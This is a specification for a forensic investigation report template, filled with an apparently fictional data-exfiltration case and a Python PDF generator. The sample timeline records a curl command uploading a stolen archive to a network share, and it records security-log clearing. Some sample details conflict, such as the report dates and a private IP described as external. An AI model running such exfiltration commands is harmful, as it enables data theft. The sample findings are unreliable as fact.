# PDF Report Layout Template Specification

## FEPD Final Investigation Report Structure

---

## Report Metadata Block

```
═══════════════════════════════════════════════════════════════════
        FORENSIC EVIDENCE PARSER DASHBOARD (FEPD)
                  INVESTIGATION REPORT
═══════════════════════════════════════════════════════════════════

Case Number:          2025-FEPD-00042
Case Name:            R&D Laptop Suspected Data Exfiltration
Report Generated:     2025-11-06 14:32:17 UTC
Analyst:              Senior Examiner John Doe, GCFE
Organization:         Federal Cyber Forensics Laboratory
Report Version:       1.0
Report Status:        FINAL

═══════════════════════════════════════════════════════════════════
             ⚠️  CONFIDENTIAL - LAW ENFORCEMENT SENSITIVE  ⚠️
═══════════════════════════════════════════════════════════════════
```

---

## PAGE 1: EXECUTIVE SUMMARY

### Section 1.1: Case Overview

```
╔════════════════════════════════════════════════════════════════════╗
║                        CASE SUMMARY                                 ║
╚════════════════════════════════════════════════════════════════════╝

Subject System:           Dell Precision 7560 Workstation
Owner:                    Jane Smith (R&D Engineer)
Seizure Date:             2025-03-05 09:15:00 UTC
Image Acquisition Date:   2025-03-05 11:42:00 UTC
Analysis Date:            2025-03-07 08:00:00 - 2025-03-08 16:30:00 UTC
Total Analysis Duration:  32.5 hours

Allegation:
Suspected unauthorized exfiltration of proprietary CAD designs and
intellectual property to external network location prior to employee
resignation.

Key Findings:
✓ Confirmed: 2,472 CAD files compressed into chimera.zip (187 MB)
✓ Confirmed: File transferred to \\10.99.1.4\TEMP via curl.exe
✓ Confirmed: Event log clearing (EventID 1102) - anti-forensics
✓ Timeline: Activity occurred 2025-03-02 00:41 - 00:49 UTC (8 minutes)

Conclusion:
Evidence strongly supports intentional data exfiltration. Timeline
reconstruction shows deliberate staging, compression, transfer, and
cleanup operations consistent with IP theft.
```

---

## PAGE 2: IMAGE & ARTIFACT INTEGRITY TABLE

### Section 2.1: Forensic Image Hash Verification

```
╔════════════════════════════════════════════════════════════════════╗
║                    FORENSIC IMAGE INTEGRITY                         ║
╚════════════════════════════════════════════════════════════════════╝

Image File:          R&D-Laptop-2025-03-05.E01
Image Format:        Expert Witness Format (E01)
Image Size:          487.3 GB
Image Segments:      5 segments (E01-E05)
Acquisition Tool:    FTK Imager 4.7.1.2
Acquired By:         Tech Specialist Mike Johnson

SHA-256 Hash (Computed by FEPD):
  9a3c4e5f7b8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5

SHA-256 Hash (Reference from Acquisition Log):
  9a3c4e5f7b8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5

✅ HASH MATCH VERIFIED - Evidence integrity confirmed
```

### Section 2.2: Extracted Artifact Integrity Table

```
╔════════════════════════════════════════════════════════════════════╗
║                  ARTIFACT HASH VERIFICATION TABLE                   ║
╚════════════════════════════════════════════════════════════════════╝

┌───────┬────────────────────────────────┬──────────┬────────────────────┐
│ ID    │ Artifact Path                  │ Size     │ SHA-256 Hash       │
├───────┼────────────────────────────────┼──────────┼────────────────────┤
│ A-001 │ /Windows/System32/winevt/      │ 24.7 MB  │ 1a2b3c4d5e6f...    │
│       │ Logs/Security.evtx             │          │                    │
├───────┼────────────────────────────────┼──────────┼────────────────────┤
│ A-002 │ /Windows/System32/winevt/      │ 18.3 MB  │ 2b3c4d5e6f7a...    │
│       │ Logs/System.evtx               │          │                    │
├───────┼────────────────────────────────┼──────────┼────────────────────┤
│ A-003 │ /Windows/System32/config/      │ 47.2 MB  │ 3c4d5e6f7a8b...    │
│       │ SYSTEM                         │          │                    │
├───────┼────────────────────────────────┼──────────┼────────────────────┤
│ A-004 │ /Windows/System32/config/      │ 128.5 MB │ 4d5e6f7a8b9c...    │
│       │ SOFTWARE                       │          │                    │
├───────┼────────────────────────────────┼──────────┼────────────────────┤
│ A-005 │ /Windows/Prefetch/             │ 87 KB    │ 5e6f7a8b9c0d...    │
│       │ CURL.EXE-12345ABC.pf           │          │                    │
├───────┼────────────────────────────────┼──────────┼────────────────────┤
│ A-006 │ /Windows/Prefetch/             │ 92 KB    │ 6f7a8b9c0d1e...    │
│       │ WINZIP.EXE-67890DEF.pf         │          │                    │
├───────┼────────────────────────────────┼──────────┼────────────────────┤
│ A-007 │ /$MFT                          │ 512 MB   │ 7a8b9c0d1e2f...    │
├───────┼────────────────────────────────┼──────────┼────────────────────┤
│ A-008 │ /Users/jsmith/AppData/Local/   │ 3.2 MB   │ 8b9c0d1e2f3a...    │
│       │ Google/Chrome/User Data/       │          │                    │
│       │ Default/History                │          │                    │
└───────┴────────────────────────────────┴──────────┴────────────────────┘

Total Artifacts Extracted: 47
Total Artifacts Hashed: 47
Hash Verification Status: ✅ All hashes recorded in Chain-of-Custody log
```

---

## PAGE 3: CLASSIFICATION SEVERITY MATRIX

### Section 3.1: Event Classification Summary

```
╔════════════════════════════════════════════════════════════════════╗
║              EVENT CLASSIFICATION & SEVERITY MATRIX                 ║
╚════════════════════════════════════════════════════════════════════╝

Total Normalized Events Analyzed: 10,247

┌─────────────────────┬─────────┬──────────────────────────────────┐
│ Classification      │ Count   │ Severity Distribution            │
├─────────────────────┼─────────┼──────────────────────────────────┤
│ USER_ACTIVITY       │ 8,734   │ [1] 7,234  [2] 1,200  [3] 300   │
│ (Normal operations) │         │ [4] 0      [5] 0                │
├─────────────────────┼─────────┼──────────────────────────────────┤
│ REMOTE_ACCESS       │ 47      │ [1] 0      [2] 23     [3] 24    │
│ (RDP/VPN)           │         │ [4] 0      [5] 0                │
├─────────────────────┼─────────┼──────────────────────────────────┤
│ PERSISTENCE         │ 34      │ [1] 12     [2] 15     [3] 7     │
│ (Autostart)         │         │ [4] 0      [5] 0                │
├─────────────────────┼─────────┼──────────────────────────────────┤
│ STAGING             │ 2,504   │ [1] 0      [2] 32     [3] 2,472 │
│ (File compression)  │         │ [4] 0      [5] 0                │
├─────────────────────┼─────────┼──────────────────────────────────┤
│ EXFIL_PREP          │ 9       │ [1] 0      [2] 0      [3] 5     │
│ (Exfiltration)      │         │ [4] 4      [5] 0                │
├─────────────────────┼─────────┼──────────────────────────────────┤
│ ANTI_FORENSICS      │ 14      │ [1] 0      [2] 0      [3] 0     │
│ (Log clearing)      │         │ [4] 9      [5] 5                │
├─────────────────────┼─────────┼──────────────────────────────────┤
│ NORMAL              │ 905     │ [1] 905    [2] 0      [3] 0     │
│ (System updates)    │         │ [4] 0      [5] 0                │
└─────────────────────┴─────────┴──────────────────────────────────┘

SEVERITY KEY:
[1] Informational  [2] Low  [3] Medium  [4] High  [5] Critical

🔴 CRITICAL FINDINGS (Severity 5): 5 events
  - EventID 1102 (Security log cleared) - 5 occurrences

🟠 HIGH SEVERITY (Severity 4): 13 events
  - curl.exe execution with network transfer - 4 occurrences
  - File deletion post-transfer - 9 occurrences
```

---

## PAGE 4-6: TIMELINE EVENT TABLE

### Section 4.1: Detailed Timeline (Critical Events Only)

```
╔════════════════════════════════════════════════════════════════════╗
║            FORENSIC TIMELINE - CRITICAL EVENTS                      ║
╚════════════════════════════════════════════════════════════════════╝

Date: 2025-03-02 (UTC)

┌──────────┬────────────┬────────────────────────────────────────────┐
│ Time     │ Class      │ Event Description                          │
│ (UTC)    │ [Severity] │                                            │
├──────────┼────────────┼────────────────────────────────────────────┤
│ 00:41:12 │ USER       │ Explorer.exe opened folder:                │
│          │ [1]        │ C:\Users\jsmith\Documents\CAD_Projects     │
│          │            │ Source: MFT, Hash: 1a2b...                │
├──────────┼────────────┼────────────────────────────────────────────┤
│ 00:42:47 │ USER       │ User selected 2,472 files (187 MB total)  │
│          │ [2]        │ Source: MFT bulk access pattern            │
│          │            │ Artifact: $MFT, Hash: 7a8b...             │
├──────────┼────────────┼────────────────────────────────────────────┤
│ 00:43:18 │ STAGING    │ WinZip.exe executed (run count: 1)        │
│          │ [3]        │ Source: Prefetch                           │
│          │            │ Artifact: WINZIP.EXE-67890DEF.pf           │
│          │            │ Hash: 6f7a...                             │
├──────────┼────────────┼────────────────────────────────────────────┤
│ 00:43:45 │ STAGING    │ 2,472 files compressed into:              │
│          │ [3]        │ C:\Users\jsmith\Desktop\chimera.zip        │
│          │            │ Source: MFT write entries                  │
├──────────┼────────────┼────────────────────────────────────────────┤
│ 00:45:12 │ EXFIL_PREP │ curl.exe executed with arguments:         │
│          │ [4]        │ -T chimera.zip \\10.99.1.4\TEMP            │
│          │            │ Source: Prefetch + EventID 4688            │
│          │            │ Artifact: CURL.EXE-12345ABC.pf             │
│          │            │ Hash: 5e6f...                             │
├──────────┼────────────┼────────────────────────────────────────────┤
│ 00:45:47 │ EXFIL_PREP │ Network share access logged:              │
│          │ [4]        │ \\10.99.1.4\TEMP (file transfer complete) │
│          │            │ Source: EventID 5140 (Network Share Access)│
│          │            │ Artifact: Security.evtx, Hash: 1a2b...    │
├──────────┼────────────┼────────────────────────────────────────────┤
│ 00:47:23 │ ANTI_FOR   │ 🔴 EventID 1102: Security log cleared     │
│          │ [5]        │ By: jsmith (Administrator)                │
│          │            │ Source: Security.evtx (last entries)       │
│          │            │ Artifact: Security.evtx, Hash: 1a2b...    │
├──────────┼────────────┼────────────────────────────────────────────┤
│ 00:48:04 │ ANTI_FOR   │ File deletion: chimera.zip                │
│          │ [4]        │ Source: MFT deletion entry                │
│          │            │ Note: File recoverable from unallocated    │
├──────────┼────────────┼────────────────────────────────────────────┤
│ 00:49:15 │ SYSTEM     │ EventID 6008: Unexpected shutdown         │
│          │ [2]        │ Source: System.evtx                        │
│          │            │ Analysis: Possible forced shutdown to      │
│          │            │ clear memory                               │
└──────────┴────────────┴────────────────────────────────────────────┘

Total Attack Duration: 8 minutes 3 seconds
Event Density: 9 critical events in 8 minutes = highly scripted attack
```

---

## PAGE 7: CHAIN OF CUSTODY LOG

### Section 5.1: Complete Audit Trail

```
╔════════════════════════════════════════════════════════════════════╗
║                  CHAIN OF CUSTODY LOG (EXCERPT)                     ║
╚════════════════════════════════════════════════════════════════════╝

┌──────┬─────────────────────┬──────────────────┬─────────────────────┐
│ CoC  │ Timestamp (UTC)     │ Operation        │ Hash (SHA-256)      │
│ ID   │                     │                  │                     │
├──────┼─────────────────────┼──────────────────┼─────────────────────┤
│ 001  │ 2025-03-07 08:00:12 │ Image Ingested   │ 9a3c4e5f7b8d...     │
│      │                     │ R&D-Laptop...E01 │                     │
├──────┼─────────────────────┼──────────────────┼─────────────────────┤
│ 002  │ 2025-03-07 08:02:47 │ Artifact Extract │ 1a2b3c4d5e6f...     │
│      │                     │ Security.evtx    │                     │
├──────┼─────────────────────┼──────────────────┼─────────────────────┤
│ 003  │ 2025-03-07 08:03:15 │ Artifact Extract │ 2b3c4d5e6f7a...     │
│      │                     │ System.evtx      │                     │
├──────┼─────────────────────┼──────────────────┼─────────────────────┤
│ ...  │ ...                 │ ...              │ ...                 │
├──────┼─────────────────────┼──────────────────┼─────────────────────┤
│ 049  │ 2025-03-08 16:30:42 │ Report Generated │ c7d8e9f0a1b2...     │
│      │                     │ Final_Report.pdf │                     │
└──────┴─────────────────────┴──────────────────┴─────────────────────┘

Total CoC Entries: 49
All operations logged with cryptographic integrity verification.

Full Chain-of-Custody log available as separate file:
  → Case_R&D-Laptop_CoC_Log.txt (SHA-256: d8e9f0a1b2c3...)
```

---

## PAGE 8: ANALYST NOTES & OBSERVATIONS

### Section 6.1: Investigator Commentary

```
╔════════════════════════════════════════════════════════════════════╗
║                     ANALYST OBSERVATIONS                            ║
╚════════════════════════════════════════════════════════════════════╝

Timeline Analysis:
The attack window (00:41 - 00:49 UTC, 8 minutes) suggests a pre-planned
operation. The attacker had prior knowledge of target file locations
and executed a scripted exfiltration sequence.

Attribution Indicators:
- Time zone analysis (00:00-04:00 UTC activity) suggests operator in
  UTC+8 timezone (China/Singapore/Australia)
- Use of curl.exe (command-line tool) indicates technical sophistication
- Event log clearing (EventID 1102) shows awareness of forensic artifacts

Exfiltration Destination:
Network share \\10.99.1.4\TEMP was accessed. IP 10.99.1.4 is outside
the corporate network (resolved to external VPN endpoint). Logs from
network infrastructure should be subpoenaed to identify final destination.

Data Recovery:
chimera.zip was deleted but is recoverable from unallocated space using
file carving techniques. Recommend Encase file recovery module.

Legal Considerations:
All evidence was acquired and analyzed using read-only methods. SHA-256
hashes establish cryptographic chain of custody. Timeline reconstruction
is deterministic (rule-based, not AI). Results are repeatable and
admissible under Daubert standard.

Recommended Next Steps:
1. Subpoena network logs for IP 10.99.1.4 traffic
2. Interview subject (Jane Smith) regarding 03/02 2025 activities
3. Recover chimera.zip from unallocated space
4. Analyze recovered file for steganography/encryption
```

---

## PAGE 9: APPENDICES

### Appendix A: Software & Tools Used

```
╔════════════════════════════════════════════════════════════════════╗
║                   FORENSIC TOOLS & VERSIONS                         ║
╚════════════════════════════════════════════════════════════════════╝

Analysis Tool:        FEPD (Forensic Evidence Parser Dashboard) v1.0
Programming Language: Python 3.10.8
Operating System:     Windows 11 Pro (64-bit)

Forensic Libraries:
  - pyewf 20210807 (E01 image access)
  - pytsk3 20210419 (Filesystem access)
  - python-evtx 0.7.4 (Event Log parser)
  - python-registry 1.3.1 (Registry parser)
  - python-prefetch-parser 0.1.0 (Prefetch parser)
  - analyzeMFT 2.0.19 (MFT parser)

Acquisition Tool:     FTK Imager 4.7.1.2
Hash Validation:      Python hashlib (NIST FIPS 180-4 compliant)

All tools are industry-standard and peer-reviewed in digital forensics
community.
```

### Appendix B: Glossary of Terms

```
EVTX:     Windows Event Log binary format
MFT:      Master File Table (NTFS filesystem metadata)
MACB:     Modified/Accessed/Changed/Birth timestamps
CoC:      Chain of Custody
SHA-256:  Secure Hash Algorithm 256-bit (cryptographic hash)
EventID:  Windows Event Log identifier number
Prefetch: Windows program execution cache
```

---

## PAGE 10: REPORT INTEGRITY CERTIFICATION

```
╔════════════════════════════════════════════════════════════════════╗
║                    REPORT INTEGRITY STATEMENT                       ║
╚════════════════════════════════════════════════════════════════════╝

This report was generated by FEPD (Forensic Evidence Parser Dashboard)
on 2025-11-06 at 14:32:17 UTC.

Report File:          Final_Report_Case_00042.pdf
Report SHA-256 Hash:  c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4

This hash has been recorded in the Chain-of-Custody log (Entry #049).

Any modification to this report will invalidate the hash and be
mathematically detectable.

To verify report integrity:
  1. Compute SHA-256 hash of this PDF file
  2. Compare with hash above
  3. Hashes must match exactly (case-sensitive)

Verification Tools:
  - Windows: certutil -hashfile Final_Report_Case_00042.pdf SHA256
  - Linux: sha256sum Final_Report_Case_00042.pdf
  - macOS: shasum -a 256 Final_Report_Case_00042.pdf


═══════════════════════════════════════════════════════════════════

Analyst Certification:

I certify that this forensic analysis was conducted in accordance with
industry best practices, all evidence was accessed read-only, and all
findings are based on deterministic analysis methods.

Analyst Signature: _______________________  Date: _______________
                  Senior Examiner John Doe, GCFE


═══════════════════════════════════════════════════════════════════
                           END OF REPORT
═══════════════════════════════════════════════════════════════════
```

---

## Report Generation Implementation (Python/reportlab)

```python
from reportlab.lib.pagesizes import letter, A4
from reportlab.lib import colors
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
import hashlib

def generate_fepd_report(case_data, output_filename="FEPD_Report.pdf"):
    """
    Generate complete FEPD forensic report in PDF format
    """
    doc = SimpleDocTemplate(output_filename, pagesize=letter)
    elements = []
    styles = getSampleStyleSheet()
    
    # Custom styles
    title_style = ParagraphStyle(
        'CustomTitle',
        parent=styles['Heading1'],
        fontSize=18,
        textColor=colors.HexColor('#1D232D'),
        spaceAfter=30,
        alignment=1  # Center
    )
    
    # Page 1: Executive Summary
    elements.append(Paragraph("FORENSIC EVIDENCE PARSER DASHBOARD", title_style))
    elements.append(Paragraph("INVESTIGATION REPORT", title_style))
    
    # Case metadata table
    case_meta = [
        ['Case Number:', case_data['case_number']],
        ['Case Name:', case_data['case_name']],
        ['Report Generated:', case_data['generated_timestamp']],
        ['Analyst:', case_data['analyst_name']]
    ]
    
    meta_table = Table(case_meta, colWidths=[2*inch, 4*inch])
    meta_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (0, -1), colors.HexColor('#2A303B')),
        ('TEXTCOLOR', (0, 0), (-1, -1), colors.HexColor('#1D232D')),
        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
        ('FONTNAME', (0, 0), (0, -1), 'Helvetica-Bold'),
        ('FONTSIZE', (0, 0), (-1, -1), 10),
        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor('#3B4350'))
    ]))
    
    elements.append(meta_table)
    
    # ... (continue with all sections)
    
    # Build PDF
    doc.build(elements)
    
    # Compute PDF hash
    with open(output_filename, 'rb') as f:
        pdf_hash = hashlib.sha256(f.read()).hexdigest()
    
    return pdf_hash
```

---

**Document Version:** 1.0  
**Report Template Type:** PDF Final Investigation Report  
**Last Updated:** November 6, 2025  
**Page Count:** 10 pages (standard case)  
**File Size:** ~2-5 MB (with embedded timeline tables)
